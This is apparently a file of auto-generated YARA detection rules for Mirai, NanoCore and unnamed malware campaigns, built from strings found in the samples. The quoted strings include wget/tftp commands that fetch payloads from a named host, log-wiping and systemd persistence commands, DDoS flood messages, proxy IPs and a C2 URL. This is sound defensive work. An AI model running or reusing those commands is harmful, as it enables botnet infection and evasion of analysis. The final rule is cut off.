rule Sightlines_tlsh_33f4ad15_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-33f4ad15"
        date = "2026-10-17"
        campaign = "tlsh-33f4ad15"
        family = "mirai"
        hash = "6734ea28fe619758e55f8562600c83175297e912899e5bac7c0b8c38cb0fed20"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-33f4ad15.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "busybox tftp -g -r %s -l q wemqmewkqewq.work.gd" ascii
        $s2 = "wget -O q http://wemqmewkqewq.work.gd/%s" ascii
        $s3 = "Accept-Encoding: gzip, deflate, br" ascii
        $s4 = "Accept-Language: en-US,en;q=0.9" ascii
        $s5 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3" ascii
        $s6 = "fw start m=%s dst=%u port=%u ms=%u" ascii
        $s7 = "SSH-2.0-OpenSSH_9.2p1 Debian-2" ascii
        $s8 = "socks4://109.107.166.207:30385" ascii
        $s9 = "socks4://185.196.178.238:60606" ascii
        $s10 = "socks4://159.224.243.185:61303" ascii
        $s11 = "socks4://180.183.149.236:5678" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_host_f7f511d2_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-f7f511d2"
        date = "2026-10-17"
        campaign = "host-f7f511d2"
        family = "mirai"
        hash = "060b43e899cf21bee854bd3b7cab84024328c95961570f72c22b359bc327129e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-f7f511d2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curl -s -o /dev/null --max-time 15 -w '%{speed_download} %{size_download}' 'https://speed.cloudflare" ascii
        $s1 = "[%s] speedtest: %.2f Mbps down (%.2f MB/s, %.1f MB sample) [curl]" ascii
        $s2 = "[%s] udp_legit: %d threads preset (nproc=%d), size=%d, %ds" ascii
        $s3 = "[%s] arch: pointer=%d-bit, endian=%s, caps: threads=%d discord_socks=%d" ascii
        $s4 = "[%s] start_flood: usage: <mode> <ip> <port> [args]" ascii
        $s5 = "[%s] syn_hs established %d flows (%ld ok, %ld fail), now spewing" ascii
        $s6 = ".com/__down?bytes=10000000' 2>/dev/null" ascii
        $s7 = "command -v speedtest-cli >/dev/null 2>&1" ascii
        $s8 = "[%s] udp_legit worker done: %ld pkts x %d B" ascii
        $s9 = "[%s] udpcustom: sendto failed after %ld pkts: %s" ascii
        $s10 = "[%s] ovhbypass: mode=%s port=%d size=%d burst=%d gap=%dms %ds" ascii
        $s11 = "[%s] udp_legit done: %d threads, %d secs" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1394192 and 12 of them
}

rule Sightlines_tlsh_f34b06a7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f34b06a7"
        date = "2026-10-17"
        campaign = "tlsh-f34b06a7"
        family = "mirai"
        hash = "0baa103fe39bb76fe96028eed77cdd198cbfdc2aac4a00e26d132488d9260561"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f34b06a7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "busybox tftp -g -r %s -l q wemqmewkqewq.work.gd" ascii
        $s2 = "wget -O q http://wemqmewkqewq.work.gd/%s" ascii
        $s3 = "Accept-Encoding: gzip, deflate, br" ascii
        $s4 = "Accept-Language: en-US,en;q=0.9" ascii
        $s5 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3" ascii
        $s6 = "fw start m=%s dst=%u port=%u ms=%u" ascii
        $s7 = "SSH-2.0-OpenSSH_9.2p1 Debian-2" ascii
        $s8 = "socks4://109.107.166.207:30385" ascii
        $s9 = "socks4://185.196.178.238:60606" ascii
        $s10 = "socks4://159.224.243.185:61303" ascii
        $s11 = "socks4://180.183.149.236:5678" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f6c3f59e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f6c3f59e"
        date = "2026-10-17"
        campaign = "tlsh-f6c3f59e"
        family = "mirai"
        hash = "00bd2dec0ae7acd5240da4146f4a7681e2b1c6e1af775e77efeccd742dca09e0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f6c3f59e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "busybox tftp -g -r %s -l q wemqmewkqewq.work.gd" ascii
        $s2 = "wget -O q http://wemqmewkqewq.work.gd/%s" ascii
        $s3 = "Accept-Encoding: gzip, deflate, br" ascii
        $s4 = "Accept-Language: en-US,en;q=0.9" ascii
        $s5 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3" ascii
        $s6 = "fw start m=%s dst=%u port=%u ms=%u" ascii
        $s7 = "SSH-2.0-OpenSSH_9.2p1 Debian-2" ascii
        $s8 = "socks4://109.107.166.207:30385" ascii
        $s9 = "socks4://185.196.178.238:60606" ascii
        $s10 = "socks4://159.224.243.185:61303" ascii
        $s11 = "socks4://180.183.149.236:5678" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_694ac11c_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-694ac11c"
        date = "2026-10-17"
        campaign = "tlsh-694ac11c"
        family = "mirai"
        hash = "55c3a37165d536c7c83af6ed706212924117277c07987c1def6529cbfc19b06d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-694ac11c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "busybox tftp -g -r %s -l q wemqmewkqewq.work.gd" ascii
        $s2 = "wget -O q http://wemqmewkqewq.work.gd/%s" ascii
        $s3 = "Accept-Encoding: gzip, deflate, br" ascii
        $s4 = "Accept-Language: en-US,en;q=0.9" ascii
        $s5 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3" ascii
        $s6 = "fw start m=%s dst=%u port=%u ms=%u" ascii
        $s7 = "SSH-2.0-OpenSSH_9.2p1 Debian-2" ascii
        $s8 = "socks4://109.107.166.207:30385" ascii
        $s9 = "socks4://185.196.178.238:60606" ascii
        $s10 = "socks4://159.224.243.185:61303" ascii
        $s11 = "socks4://180.183.149.236:5678" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_9707be8d_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9707be8d"
        date = "2026-10-17"
        campaign = "tlsh-9707be8d"
        family = "mirai"
        hash = "067120ddcaa4c0dab76f83e7a194a3f230e9b94749ede86ba17ca318d250f70c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9707be8d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "busybox tftp -g -r %s -l q wemqmewkqewq.work.gd" ascii
        $s2 = "wget -O q http://wemqmewkqewq.work.gd/%s" ascii
        $s3 = "Accept-Encoding: gzip, deflate, br" ascii
        $s4 = "Accept-Language: en-US,en;q=0.9" ascii
        $s5 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3" ascii
        $s6 = "fw start m=%s dst=%u port=%u ms=%u" ascii
        $s7 = "SSH-2.0-OpenSSH_9.2p1 Debian-2" ascii
        $s8 = "socks4://109.107.166.207:30385" ascii
        $s9 = "socks4://185.196.178.238:60606" ascii
        $s10 = "socks4://159.224.243.185:61303" ascii
        $s11 = "socks4://180.183.149.236:5678" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f02ec3b2_nanocore
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f02ec3b2"
        date = "2026-10-17"
        campaign = "tlsh-f02ec3b2"
        family = "nanocore"
        hash = "2d54bf055e8791b01f58eadb2926dd4ddad3646d6ebdd92073b6b29c5c8ec2de"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f02ec3b2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "#=qtlZnL8mho$rv1eTFz0Mw9UYFC_yCabEZ0xtVePn6wR5aSHE7ti3UfKg2l7D0_xk8" ascii
        $s1 = "#=qgbI51haY38WJ4NumXDqnLC_uKv$aRHAyD63c9HgGYzlsFjikAASqT8RCSswEMouz" ascii
        $s2 = "#=qF4e058OW__NtTzhWOs1UXEJiHrTSwnIZ3q2u9UaLbo49AZaoog8nMfoDeA9BGVvy" ascii
        $s3 = "#=qVCHxDTr$$bwFMb6i9vBKRZciaa69edA3gsLNOty0RAzCorWRBUh2v0PgySYBEvZ0" ascii
        $s4 = "#=qCGokdf0OOxeMJLDkXSfc3NPmwygIQ29RjKQWj$wbNGB9C1pPgma_891QiNyTRXcA" ascii
        $s5 = "#=qK4wGebauvtmTKO0oAyLFzHLhr9rU3HNJmU_ur7Zop$YvLzV4HzmIQ45YslW_q1Vc" ascii
        $s6 = "#=qXjNBjXFhVcOvrRAG8alfq96_gJ4jOa0wwNOaztY3QjLWnMT6wXGDzBnHuUkef5N0" ascii
        $s7 = "#=qyEH54IW$f9fUJb7FOR8r3vj6e$onLGrpm2VGycjbl9TZJEqkwtA4y4bL9ExOWpiA" ascii
        $s8 = "#=q3TG8MLoZf1Y44PREVW$6m76IGmuYE_BOhC_OTjkQJFtYWwRtSeFqevP9hiteuLfz" ascii
        $s9 = "#=qQkx1bBZns8hPde7$PcvfUl2fAairj6t_H8ve7nJO2s3BIB3t7PXd4ZR9h0JHyxrX" ascii
        $s10 = "#=q6Aboe3ONIkez7GgqcdWPi0_vrT_i53_89HUeagGM6MThXvFkvl8hpSeHO1UJawKN" ascii
        $s11 = "#=qenWi8guqQrvoGB55djo0ka_844yTmViBn5_Fr2X6HAceO7AJErk_Rh7nfkfqtUbq" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1632fc29_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1632fc29"
        date = "2026-10-17"
        campaign = "tlsh-1632fc29"
        family = "mirai"
        hash = "0d8cdcb2d71adf2c3dab3475154b40c4388eb8d54fea4544de0218d94b714513"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1632fc29.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "busybox tftp -g -r %s -l q wemqmewkqewq.work.gd" ascii
        $s2 = "wget -O q http://wemqmewkqewq.work.gd/%s" ascii
        $s3 = "Accept-Encoding: gzip, deflate, br" ascii
        $s4 = "Accept-Language: en-US,en;q=0.9" ascii
        $s5 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3" ascii
        $s6 = "fw start m=%s dst=%u port=%u ms=%u" ascii
        $s7 = "SSH-2.0-OpenSSH_9.2p1 Debian-2" ascii
        $s8 = "socks4://109.107.166.207:30385" ascii
        $s9 = "socks4://185.196.178.238:60606" ascii
        $s10 = "socks4://159.224.243.185:61303" ascii
        $s11 = "socks4://180.183.149.236:5678" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_4dcabbb4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-4dcabbb4"
        date = "2026-10-17"
        campaign = "imphash-4dcabbb4"
        family = ""
        hash = "5ccd526f0daccce6f58306d1d33a77d41b43817ac2ca0cf95f5d3d0a5ac055a8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-4dcabbb4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s4 = "Embarcadero Delphi for Win32 compiler version 36.0 (29.0.55362.2017)" ascii
        $s5 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s6 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s7 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s8 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s9 = "VTEnumerable<System.Generics.Collections.TPair<System.TypInfo.PTypeInfo,System.string>>'" ascii
        $s10 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>'" ascii
        $s11 = "        <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 38779236 and 12 of them
}

rule Sightlines_tlsh_63f610dc_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-63f610dc"
        date = "2026-10-17"
        campaign = "tlsh-63f610dc"
        family = ""
        hash = "082ae04ff9306111505f1fcdbef1aca226d2c02f05cd4300374fa64f58a99778"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-63f610dc.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\" (FormatMessageW() returned error " ascii
        $s1 = "AWAVVWUSPH" ascii
        $s2 = "D$ H3L$ H3" ascii
        $s3 = "AVVWUSE1" ascii
        $s4 = "OS Error " ascii
        $s5 = "L$HH1D$ " ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1327104 and 5 of them
}

rule Sightlines_imphash_899539c0_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-899539c0"
        date = "2026-10-17"
        campaign = "imphash-899539c0"
        family = ""
        hash = "082ae04ff9306111505f1fcdbef1aca226d2c02f05cd4300374fa64f58a99778"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-899539c0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "b;BC!:5j~cSR9aZknE0#Qwe'V,3I@vApf*i6<1tF]&rql$OPgsHxDMNJ%.zL_7-mJDDDDCs;aR;F9SE,!6M60.nDxPe####i!ql&" ascii
        $s1 = "PvlxQ$*x<1gDP*<gMs*V0N60iiis3n-,FZ_.xj$~$..-RLLLS%]Q0~O#EVf'zI&wi~reI<*PPAOOO7FEc<q,~!C*CB&reduction" ascii
        $s2 = "S:,,lrzR%~~~':I1Zv&6v.D6j;qfA%N1O,OscSJjjje!9iA~L1IQx*tbJp$!]6$'j:pNt<<<<x*Cmr*j_zwcbQIV#part come k" ascii
        $s3 = "ZNi*ccQnqRRR3~l]i@z<sgJt,j%F0eqREf-esNqF;~.gwDQQQ6:rOqv~OrnB6PSrrr.FsC;Lb:fIp:cFk_b6n:*x'BcIA!bFVm3r" ascii
        $s4 = "p@@@@q,ADx1;.B;kJIvZ<l@@tjN555wm3*_xq*&Ot&3RC:\\ProgramData\\lancer\\scruiaghaps.pdfOLqqqz]9!H!9jskAJ3R" ascii
        $s5 = "lztI3C~w:::QBgA@ZxAIM%ED1xARNs::qrz;----aLa3!#l0:j$e7m63MS-wVR;SzzzcJv#ECO'ER6wcN]#EIpB_PPe&Jt0gmvQb" ascii
        $s6 = "\\PLqqqz]9~B_3!En'5.IVjHNRqsbAnF%tNNN:H<0$LinajI;QJ$Z9t]IJ!DDDCspaR7iaS<Fb6Qiaz1fDDjrz:HBBBEmwf,kNIVJ" ascii
        $s7 = "-l___R.C'B.AQ0$BVr7*w9_maHf7vvvl3b%#3~JxHn]9Zn.xZ5z6s'qOJ!DDDCspaR7iaS<Fb6Qiaz1fDDFrzliteral because" ascii
        $s8 = "tQ<<<x*5_I$vbqD07H1nm<<qaQEEEEfZ~qFS.OVi;@b0Ml';ERC:\\ProgramData\\Wireshark\\mcneauspuosh]1111Di@mLAaB" ascii
        $s9 = "cJ1#EC]#nr$5&3]#bqtzz<rzjnbbbk7*@JE1@17*@k7g'NcPve.<'m71ItaHA';D,p*<'N$1An-:0BBBEmsv~'6p,0MZsigI~xOB" ascii
        $s10 = "AO5!!!!#;'pzv%*zcNvQ~CHv3333&'EDg#BJ*qS1cI-MfS3.ln$aaa@SQt<Afq<3;tl-zp65x]7aazOpenFileRequiringGestu" ascii
        $s11 = "S!@R0lpaS@V!S#xtBRfRIIIrVAJ;g_%*gAN3V~J*fkMs<jDzQvMHl~xHII9LUFA Combined Mass Storage Device#gnnnpa'" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1294336 and 12 of them
}

rule Sightlines_imphash_cd8a4a6f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-cd8a4a6f"
        date = "2026-10-17"
        campaign = "imphash-cd8a4a6f"
        family = ""
        hash = "019558221f682a00e6ec301308208096680f0d6d7f8f28b20b1b959f7c4bb924"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-cd8a4a6f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "7`=t 1#/% 4\"o7TTxcpLe8yPpDxgh67xXSBWJnVu9bW8t7GU:YG_t" ascii
        $s1 = "xmlns=\"urn:schemas-microsoft-com:asm.v3\"><windowsSettings><dpiAware xmlns=\"http://schemas.microsoft." ascii
        $s2 = "com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" ascii
        $s3 = "as-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" u" ascii
        $s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schem" ascii
        $s5 = "iAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><application " ascii
        $s6 = "E:\\CryptoNight\\bitmonero-master\\src\\miner\\Release\\Crypto.pdb" ascii
        $s7 = "_erfob __gnu[axx::O_CoNcurrefce_ufl/sc_erzkr" ascii
        $s8 = "$trogzam kannot bi run in DOS mode$-" ascii
        $s9 = "rulocati_n(0rmtocol v5Rs)ol($`" ascii
        $s10 = "0__cxxcbit51)_[\"oreigj_exceptiO" ascii
        $s11 = "3034383<3@3D3H3L3P3T3X3\\3`3d3h3l3p3t3x3|3" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3156992 and 9 of them
}

rule Sightlines_tlsh_45ebee99_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-45ebee99"
        date = "2026-10-17"
        campaign = "tlsh-45ebee99"
        family = ""
        hash = "019558221f682a00e6ec301308208096680f0d6d7f8f28b20b1b959f7c4bb924"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-45ebee99.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "7`=t 1#/% 4\"o7TTxcpLe8yPpDxgh67xXSBWJnVu9bW8t7GU:YG_t" ascii
        $s1 = "xmlns=\"urn:schemas-microsoft-com:asm.v3\"><windowsSettings><dpiAware xmlns=\"http://schemas.microsoft." ascii
        $s2 = "com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" ascii
        $s3 = "as-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" u" ascii
        $s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schem" ascii
        $s5 = "iAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><application " ascii
        $s6 = "E:\\CryptoNight\\bitmonero-master\\src\\miner\\Release\\Crypto.pdb" ascii
        $s7 = "_erfob __gnu[axx::O_CoNcurrefce_ufl/sc_erzkr" ascii
        $s8 = "$trogzam kannot bi run in DOS mode$-" ascii
        $s9 = "rulocati_n(0rmtocol v5Rs)ol($`" ascii
        $s10 = "0__cxxcbit51)_[\"oreigj_exceptiO" ascii
        $s11 = "3034383<3@3D3H3L3P3T3X3\\3`3d3h3l3p3t3x3|3" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3156992 and 9 of them
}

rule Sightlines_imphash_6f900601_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-6f900601"
        date = "2026-10-17"
        campaign = "imphash-6f900601"
        family = ""
        hash = "044af04899163a03bbdc95c3bc2499129497e74cbf1b3f17b711b4f1fbff4df6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-6f900601.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " inflate 1.2.8 Copyright 1995-2013 Mark Adler " ascii
        $s1 = "Failed to convert pyhome to ANSI (invalid multibyte string)" ascii
        $s2 = "Failed to get address for PyMarshal_ReadObjectFromString" ascii
        $s3 = "Failed to convert pypath to ANSI (invalid multibyte string)" ascii
        $s4 = "PyInstaller: pyi_win32_utils_to_utf8 failed." ascii
        $s5 = "WARNING: file already exists but should not: %s" ascii
        $s6 = "Cannot allocate memory for ARCHIVE_STATUS" ascii
        $s7 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" ascii
        $s8 = "Failed to get address for PyObject_CallFunction" ascii
        $s9 = "Failed to get address for Py_FileSystemDefaultEncoding" ascii
        $s10 = "Failed to get address for PyImport_ExecCodeModule" ascii
        $s11 = "Failed to get address for PyRun_SimpleString" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 12499466 and 12 of them
}

rule Sightlines_rich_header_hash_7c5a518b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-7c5a518b"
        date = "2026-10-17"
        campaign = "rich_header_hash-7c5a518b"
        family = ""
        hash = "044af04899163a03bbdc95c3bc2499129497e74cbf1b3f17b711b4f1fbff4df6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-7c5a518b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " inflate 1.2.8 Copyright 1995-2013 Mark Adler " ascii
        $s1 = "Failed to convert pyhome to ANSI (invalid multibyte string)" ascii
        $s2 = "Failed to get address for PyMarshal_ReadObjectFromString" ascii
        $s3 = "Failed to convert pypath to ANSI (invalid multibyte string)" ascii
        $s4 = "PyInstaller: pyi_win32_utils_to_utf8 failed." ascii
        $s5 = "WARNING: file already exists but should not: %s" ascii
        $s6 = "Cannot allocate memory for ARCHIVE_STATUS" ascii
        $s7 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" ascii
        $s8 = "Failed to get address for PyObject_CallFunction" ascii
        $s9 = "Failed to get address for Py_FileSystemDefaultEncoding" ascii
        $s10 = "Failed to get address for PyImport_ExecCodeModule" ascii
        $s11 = "Failed to get address for PyRun_SimpleString" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 12499466 and 12 of them
}

rule Sightlines_tlsh_9b6673e4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9b6673e4"
        date = "2026-10-17"
        campaign = "tlsh-9b6673e4"
        family = ""
        hash = "37cf4cd5a5063cf75dacc510019d3c90b936cf6560518883f53e890b7efa72c8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9b6673e4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " inflate 1.2.8 Copyright 1995-2013 Mark Adler " ascii
        $s1 = "Failed to convert pyhome to ANSI (invalid multibyte string)" ascii
        $s2 = "Failed to get address for PyMarshal_ReadObjectFromString" ascii
        $s3 = "Failed to convert pypath to ANSI (invalid multibyte string)" ascii
        $s4 = "PyInstaller: pyi_win32_utils_to_utf8 failed." ascii
        $s5 = "WARNING: file already exists but should not: %s" ascii
        $s6 = "Cannot allocate memory for ARCHIVE_STATUS" ascii
        $s7 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" ascii
        $s8 = "Failed to get address for PyObject_CallFunction" ascii
        $s9 = "Failed to get address for Py_FileSystemDefaultEncoding" ascii
        $s10 = "Failed to get address for PyImport_ExecCodeModule" ascii
        $s11 = "Failed to get address for PyRun_SimpleString" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 12499466 and 12 of them
}

rule Sightlines_host_86230649_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-86230649"
        date = "2026-10-17"
        campaign = "host-86230649"
        family = "mirai"
        hash = "122e80c889c1d4f7b9f99abe635711b02aadf2d110447d2df18082458178f754"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-86230649.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s1 = "systemctl daemon-reload 2>/dev/null; systemctl enable killer-helper.service 2>/dev/null" ascii
        $s2 = "journalctl --rotate --vacuum-time=1s 2>/dev/null" ascii
        $s3 = "/etc/systemd/system/killer-helper.service" ascii
        $s4 = "Accept-Language: en-US,en;q=0.5" ascii
        $s5 = "Accept-Encoding: gzip, deflate" ascii
        $s6 = "0.0.0.0 www.hybrid-analysis.com" ascii
        $s7 = "PATH=/usr/sbin:/usr/bin:/sbin:/bin" ascii
        $s8 = "/usr/lib/systemd/.system-helper" ascii
        $s9 = "0.0.0.0 hybrid-analysis.com" ascii
        $s10 = "0.0.0.0 www.malwarebytes.com" ascii
        $s11 = "Description=System Helper" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_2d4c7b3c_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2d4c7b3c"
        date = "2026-10-17"
        campaign = "tlsh-2d4c7b3c"
        family = "mirai"
        hash = "126bffcade3468d8b84243ce192422077d23e802865b35a7c9e780fc99c02fed"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2d4c7b3c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/etc/config/resolv.conf" ascii
        $s1 = "/etc/config/hosts" ascii
        $s2 = "/proc/%d/exe" ascii
        $s3 = "Cx}1Kx}PSxK" ascii
        $s4 = "x}'Kx}j[x8" ascii
        $s5 = "}CX.}CSxN" ascii
        $s6 = "}CSx}e[x" ascii
        $s7 = "}e[x}CSx" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 7 of them
}

rule Sightlines_tlsh_09220cf5_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-09220cf5"
        date = "2026-10-17"
        campaign = "tlsh-09220cf5"
        family = "mirai"
        hash = "1340c831dbd27a87cca8c80feb90a3e98071e4d33793192467eee9cfe0343b21"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-09220cf5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s1 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s2 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s3 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s4 = "http://mkhkjxgchtfgu7uhofxzgoawntfzrkdccymveektqgpxrpjb72oq.b32.i2p/cgi-bin/prometei.cgi" ascii
        $s5 = "%s: Symbol `%s' causes overflow in R_X86_64_PC32 relocation" ascii
        $s6 = "_dl_debug_initialize (0, args.nsid)->r_state == RT_CONSISTENT" ascii
        $s7 = "_dl_debug_initialize (0, args->nsid)->r_state == RT_CONSISTENT" ascii
        $s8 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s9 = "ELFW(R_TYPE) (reloc->r_info) == R_X86_64_RELATIVE" ascii
        $s10 = "conf->nameserver_list[i]->sa_family == AF_INET6" ascii
        $s11 = "lead_zero <= (base == 16 ? (uintmax_t) INTMAX_MAX / 4 : (uintmax_t) INTMAX_MAX)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2577622 and 12 of them
}

rule Sightlines_tlsh_65d7970d_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-65d7970d"
        date = "2026-10-17"
        campaign = "tlsh-65d7970d"
        family = "mirai"
        hash = "153f4fedbeb1efa5ef23208c5bcfd2826f9f55c0811b795ca53d6af35f21b3d5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-65d7970d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
